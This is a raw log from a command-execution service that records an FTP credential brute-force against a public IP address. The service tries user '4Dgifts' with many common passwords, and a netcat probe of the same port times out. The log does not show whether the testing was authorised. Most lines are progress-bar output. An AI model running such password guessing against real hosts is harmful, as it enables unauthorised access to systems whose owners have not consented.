2025-10-24 01:45:15,437 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m75.1%[0m ETA: 74.7s Speed: 0 B/s | 225.3s | PID: 44673
2025-10-24 01:45:16,239 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m75.4%[0m ETA: 73.9s Speed: 0 B/s | 226.1s | PID: 44673
2025-10-24 01:45:17,041 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m75.6%[0m ETA: 73.1s Speed: 0 B/s | 226.9s | PID: 44673
2025-10-24 01:45:17,842 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m75.9%[0m ETA: 72.3s Speed: 0 B/s | 227.7s | PID: 44673
2025-10-24 01:45:18,644 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m76.2%[0m ETA: 71.5s Speed: 0 B/s | 228.5s | PID: 44673
2025-10-24 01:45:19,093 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Password12 (Incorrect: )
2025-10-24 01:45:19,445 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████████████████████[38;5;240m░░░░░░░░[0m] [38;5;160m76.4%[0m ETA: 70.7s Speed: 0 B/s | 229.3s | PID: 44673
2025-10-24 01:45:20,248 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m76.7%[0m ETA: 69.9s Speed: 0 B/s | 230.1s | PID: 44673
2025-10-24 01:45:21,054 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m77.0%[0m ETA: 69.1s Speed: 0 B/s | 230.9s | PID: 44673
2025-10-24 01:45:21,855 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m77.2%[0m ETA: 68.3s Speed: 0 B/s | 231.7s | PID: 44673
2025-10-24 01:45:22,563 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:security (Incorrect: )
2025-10-24 01:45:22,656 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m77.5%[0m ETA: 67.5s Speed: 0 B/s | 232.5s | PID: 44673
2025-10-24 01:45:23,458 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m77.8%[0m ETA: 66.7s Speed: 0 B/s | 233.3s | PID: 44673
2025-10-24 01:45:24,260 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m78.0%[0m ETA: 65.9s Speed: 0 B/s | 234.1s | PID: 44673
2025-10-24 01:45:25,060 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m78.3%[0m ETA: 65.1s Speed: 0 B/s | 234.9s | PID: 44673
2025-10-24 01:45:25,797 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:security1 (Incorrect: )
2025-10-24 01:45:25,866 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m78.6%[0m ETA: 64.3s Speed: 0 B/s | 235.7s | PID: 44673
2025-10-24 01:45:26,667 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m78.8%[0m ETA: 63.5s Speed: 0 B/s | 236.5s | PID: 44673
2025-10-24 01:45:27,469 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m79.1%[0m ETA: 62.7s Speed: 0 B/s | 237.3s | PID: 44673
2025-10-24 01:45:28,271 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m79.4%[0m ETA: 61.9s Speed: 0 B/s | 238.1s | PID: 44673
2025-10-24 01:45:29,071 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m79.6%[0m ETA: 61.1s Speed: 0 B/s | 238.9s | PID: 44673
2025-10-24 01:45:29,087 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:security3 (Incorrect: )
2025-10-24 01:45:29,874 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████████████████████[38;5;240m░░░░░░░[0m] [38;5;160m79.9%[0m ETA: 60.3s Speed: 0 B/s | 239.7s | PID: 44673
2025-10-24 01:45:30,675 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m80.2%[0m ETA: 59.5s Speed: 0 B/s | 240.5s | PID: 44673
2025-10-24 01:45:31,478 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m80.4%[0m ETA: 58.7s Speed: 0 B/s | 241.3s | PID: 44673
2025-10-24 01:45:31,948 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:secuirty3 (Incorrect: )
2025-10-24 01:45:32,278 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m80.7%[0m ETA: 57.9s Speed: 0 B/s | 242.1s | PID: 44673
2025-10-24 01:45:33,080 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m81.0%[0m ETA: 57.1s Speed: 0 B/s | 242.9s | PID: 44673
2025-10-24 01:45:33,881 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m81.2%[0m ETA: 56.3s Speed: 0 B/s | 243.7s | PID: 44673
2025-10-24 01:45:34,684 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m81.5%[0m ETA: 55.5s Speed: 0 B/s | 244.5s | PID: 44673
2025-10-24 01:45:35,252 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:complex1 (Incorrect: )
2025-10-24 01:45:35,486 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m81.8%[0m ETA: 54.7s Speed: 0 B/s | 245.3s | PID: 44673
2025-10-24 01:45:36,289 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m82.1%[0m ETA: 53.8s Speed: 0 B/s | 246.2s | PID: 44673
2025-10-24 01:45:37,091 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m82.3%[0m ETA: 53.0s Speed: 0 B/s | 247.0s | PID: 44673
2025-10-24 01:45:37,893 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m82.6%[0m ETA: 52.2s Speed: 0 B/s | 247.8s | PID: 44673
2025-10-24 01:45:38,641 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:complex2 (Incorrect: )
2025-10-24 01:45:38,695 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m82.9%[0m ETA: 51.4s Speed: 0 B/s | 248.6s | PID: 44673
2025-10-24 01:45:39,496 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████████████████████[38;5;240m░░░░░░[0m] [38;5;160m83.1%[0m ETA: 50.6s Speed: 0 B/s | 249.4s | PID: 44673
2025-10-24 01:45:40,298 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m83.4%[0m ETA: 49.8s Speed: 0 B/s | 250.2s | PID: 44673
2025-10-24 01:45:41,099 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m83.7%[0m ETA: 49.0s Speed: 0 B/s | 251.0s | PID: 44673
2025-10-24 01:45:41,901 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m83.9%[0m ETA: 48.2s Speed: 0 B/s | 251.8s | PID: 44673
2025-10-24 01:45:42,389 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:complex3 (Incorrect: )
2025-10-24 01:45:42,702 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m84.2%[0m ETA: 47.4s Speed: 0 B/s | 252.6s | PID: 44673
2025-10-24 01:45:43,504 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m84.5%[0m ETA: 46.6s Speed: 0 B/s | 253.4s | PID: 44673
2025-10-24 01:45:44,305 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m84.7%[0m ETA: 45.8s Speed: 0 B/s | 254.2s | PID: 44673
2025-10-24 01:45:45,107 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m85.0%[0m ETA: 45.0s Speed: 0 B/s | 255.0s | PID: 44673
2025-10-24 01:45:45,712 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:sqlserver (Incorrect: )
2025-10-24 01:45:45,908 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m85.3%[0m ETA: 44.2s Speed: 0 B/s | 255.8s | PID: 44673
2025-10-24 01:45:46,709 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m85.5%[0m ETA: 43.4s Speed: 0 B/s | 256.6s | PID: 44673
2025-10-24 01:45:47,512 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m85.8%[0m ETA: 42.6s Speed: 0 B/s | 257.4s | PID: 44673
2025-10-24 01:45:48,316 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m86.1%[0m ETA: 41.8s Speed: 0 B/s | 258.2s | PID: 44673
2025-10-24 01:45:49,116 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m86.3%[0m ETA: 41.0s Speed: 0 B/s | 259.0s | PID: 44673
2025-10-24 01:45:49,431 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:sql (Incorrect: )
2025-10-24 01:45:49,917 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████████████████████[38;5;240m░░░░░[0m] [38;5;160m86.6%[0m ETA: 40.2s Speed: 0 B/s | 259.8s | PID: 44673
2025-10-24 01:45:50,720 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m86.9%[0m ETA: 39.4s Speed: 0 B/s | 260.6s | PID: 44673
2025-10-24 01:45:51,522 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m87.1%[0m ETA: 38.6s Speed: 0 B/s | 261.4s | PID: 44673
2025-10-24 01:45:52,323 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m87.4%[0m ETA: 37.8s Speed: 0 B/s | 262.2s | PID: 44673
2025-10-24 01:45:52,678 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:sqlsql (Incorrect: )
2025-10-24 01:45:53,125 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m87.7%[0m ETA: 37.0s Speed: 0 B/s | 263.0s | PID: 44673
2025-10-24 01:45:53,926 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m87.9%[0m ETA: 36.2s Speed: 0 B/s | 263.8s | PID: 44673
2025-10-24 01:45:54,728 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m88.2%[0m ETA: 35.4s Speed: 0 B/s | 264.6s | PID: 44673
2025-10-24 01:45:55,530 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m88.5%[0m ETA: 34.6s Speed: 0 B/s | 265.4s | PID: 44673
2025-10-24 01:45:56,331 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m88.7%[0m ETA: 33.8s Speed: 0 B/s | 266.2s | PID: 44673
2025-10-24 01:45:56,336 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:password1 (Incorrect: )
2025-10-24 01:45:57,133 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m89.0%[0m ETA: 33.0s Speed: 0 B/s | 267.0s | PID: 44673
2025-10-24 01:45:57,935 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m89.3%[0m ETA: 32.2s Speed: 0 B/s | 267.8s | PID: 44673
2025-10-24 01:45:58,736 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m89.5%[0m ETA: 31.4s Speed: 0 B/s | 268.6s | PID: 44673
2025-10-24 01:45:59,537 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████████████████████████[38;5;240m░░░░[0m] [38;5;160m89.8%[0m ETA: 30.6s Speed: 0 B/s | 269.4s | PID: 44673
2025-10-24 01:45:59,566 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:password123 (Incorrect: )
2025-10-24 01:46:00,341 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m90.1%[0m ETA: 29.8s Speed: 0 B/s | 270.2s | PID: 44673
2025-10-24 01:46:01,142 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m90.3%[0m ETA: 29.0s Speed: 0 B/s | 271.0s | PID: 44673
2025-10-24 01:46:01,944 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m90.6%[0m ETA: 28.2s Speed: 0 B/s | 271.8s | PID: 44673
2025-10-24 01:46:02,747 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m90.9%[0m ETA: 27.4s Speed: 0 B/s | 272.6s | PID: 44673
2025-10-24 01:46:02,853 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:complexpassword (Incorrect: )
2025-10-24 01:46:03,549 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m91.1%[0m ETA: 26.6s Speed: 0 B/s | 273.4s | PID: 44673
2025-10-24 01:46:04,351 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m91.4%[0m ETA: 25.8s Speed: 0 B/s | 274.2s | PID: 44673
2025-10-24 01:46:05,153 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m91.7%[0m ETA: 25.0s Speed: 0 B/s | 275.0s | PID: 44673
2025-10-24 01:46:05,955 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m91.9%[0m ETA: 24.2s Speed: 0 B/s | 275.8s | PID: 44673
2025-10-24 01:46:06,358 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:database (Incorrect: )
2025-10-24 01:46:06,756 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m92.2%[0m ETA: 23.4s Speed: 0 B/s | 276.6s | PID: 44673
2025-10-24 01:46:07,557 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m92.5%[0m ETA: 22.6s Speed: 0 B/s | 277.4s | PID: 44673
2025-10-24 01:46:08,358 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m92.7%[0m ETA: 21.8s Speed: 0 B/s | 278.2s | PID: 44673
2025-10-24 01:46:09,159 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m93.0%[0m ETA: 21.0s Speed: 0 B/s | 279.0s | PID: 44673
2025-10-24 01:46:09,608 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:server (Incorrect: )
2025-10-24 01:46:09,961 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m93.3%[0m ETA: 20.2s Speed: 0 B/s | 279.8s | PID: 44673
2025-10-24 01:46:10,761 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m93.5%[0m ETA: 19.4s Speed: 0 B/s | 280.6s | PID: 44673
2025-10-24 01:46:11,562 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m93.8%[0m ETA: 18.6s Speed: 0 B/s | 281.4s | PID: 44673
2025-10-24 01:46:12,364 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m94.1%[0m ETA: 17.8s Speed: 0 B/s | 282.2s | PID: 44673
2025-10-24 01:46:13,165 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m94.3%[0m ETA: 17.0s Speed: 0 B/s | 283.0s | PID: 44673
2025-10-24 01:46:13,609 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:changeme (Incorrect: )
2025-10-24 01:46:13,967 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m94.6%[0m ETA: 16.2s Speed: 0 B/s | 283.8s | PID: 44673
2025-10-24 01:46:14,768 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m94.9%[0m ETA: 15.4s Speed: 0 B/s | 284.6s | PID: 44673
2025-10-24 01:46:15,571 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m95.1%[0m ETA: 14.6s Speed: 0 B/s | 285.4s | PID: 44673
2025-10-24 01:46:16,372 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m95.4%[0m ETA: 13.8s Speed: 0 B/s | 286.2s | PID: 44673
2025-10-24 01:46:17,173 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m95.7%[0m ETA: 13.0s Speed: 0 B/s | 287.0s | PID: 44673
2025-10-24 01:46:17,177 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:change (Incorrect: )
2025-10-24 01:46:17,974 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m95.9%[0m ETA: 12.2s Speed: 0 B/s | 287.8s | PID: 44673
2025-10-24 01:46:18,775 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m96.2%[0m ETA: 11.4s Speed: 0 B/s | 288.6s | PID: 44673
2025-10-24 01:46:19,576 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m96.5%[0m ETA: 10.6s Speed: 0 B/s | 289.4s | PID: 44673
2025-10-24 01:46:20,342 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:sqlserver2000 (Incorrect: )
2025-10-24 01:46:20,378 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m96.7%[0m ETA: 9.8s Speed: 0 B/s | 290.2s | PID: 44673
2025-10-24 01:46:21,179 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m97.0%[0m ETA: 9.0s Speed: 0 B/s | 291.0s | PID: 44673
2025-10-24 01:46:21,980 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m97.3%[0m ETA: 8.2s Speed: 0 B/s | 291.8s | PID: 44673
2025-10-24 01:46:22,782 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m97.5%[0m ETA: 7.4s Speed: 0 B/s | 292.6s | PID: 44673
2025-10-24 01:46:23,582 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m97.8%[0m ETA: 6.6s Speed: 0 B/s | 293.4s | PID: 44673
2025-10-24 01:46:24,181 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:sqlserver2005 (Incorrect: )
2025-10-24 01:46:24,383 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m98.1%[0m ETA: 5.8s Speed: 0 B/s | 294.2s | PID: 44673
2025-10-24 01:46:25,185 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m98.3%[0m ETA: 5.0s Speed: 0 B/s | 295.0s | PID: 44673
2025-10-24 01:46:25,987 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m98.6%[0m ETA: 4.1s Speed: 0 B/s | 295.9s | PID: 44673
2025-10-24 01:46:26,788 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m98.9%[0m ETA: 3.3s Speed: 0 B/s | 296.7s | PID: 44673
2025-10-24 01:46:27,238 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Sqlserver (Incorrect: )
2025-10-24 01:46:27,590 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m99.2%[0m ETA: 2.5s Speed: 0 B/s | 297.5s | PID: 44673
2025-10-24 01:46:28,392 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m99.4%[0m ETA: 1.7s Speed: 0 B/s | 298.3s | PID: 44673
2025-10-24 01:46:29,196 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m99.7%[0m ETA: 0.9s Speed: 0 B/s | 299.1s | PID: 44673
2025-10-24 01:46:30,000 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m99.9%[0m ETA: 0.3s Speed: 0 B/s | 299.9s | PID: 44673
2025-10-24 01:46:30,137 - __main__ - WARNING - ⏰ TIMEOUT: Command timed out after 300s | Terminating PID 44673
2025-10-24 01:46:30,139 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:46:30,140 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:46:30,140 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:46:30,140 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m nc -nv 138.197.27.76 21
2025-10-24 01:46:30,140 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 300.00s [38;5;208m[TIMEOUT][0m
2025-10-24 01:46:30,140 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 59 bytes
2025-10-24 01:46:30,140 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m -1
2025-10-24 01:46:30,140 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:46:30,140 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:46:30,140 - __main__ - INFO - 💾 Cached result for command: nc -nv 138.197.27.76 21
2025-10-24 01:46:30,141 - werkzeug - INFO - 127.0.0.1 - - [24/Oct/2025 01:46:30] "POST /api/command HTTP/1.1" 200 -
2025-10-24 01:46:30,325 - __main__ - INFO - 📤 STDOUT: 421 Timeout.
2025-10-24 01:46:30,750 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:SqlServer (Incorrect: )
2025-10-24 01:46:34,289 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Password1 (Incorrect: )
2025-10-24 01:46:38,062 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Password2 (Incorrect: )
2025-10-24 01:46:41,447 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:P@ssw0rd (Incorrect: )
2025-10-24 01:46:45,499 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:P@ssw0rd! (Incorrect: )
2025-10-24 01:46:49,155 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:P@55w0rd! (Incorrect: )
2025-10-24 01:46:52,638 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:P@ssword! (Incorrect: )
2025-10-24 01:46:56,882 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Password! (Incorrect: )
2025-10-24 01:47:00,495 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:password! (Incorrect: )
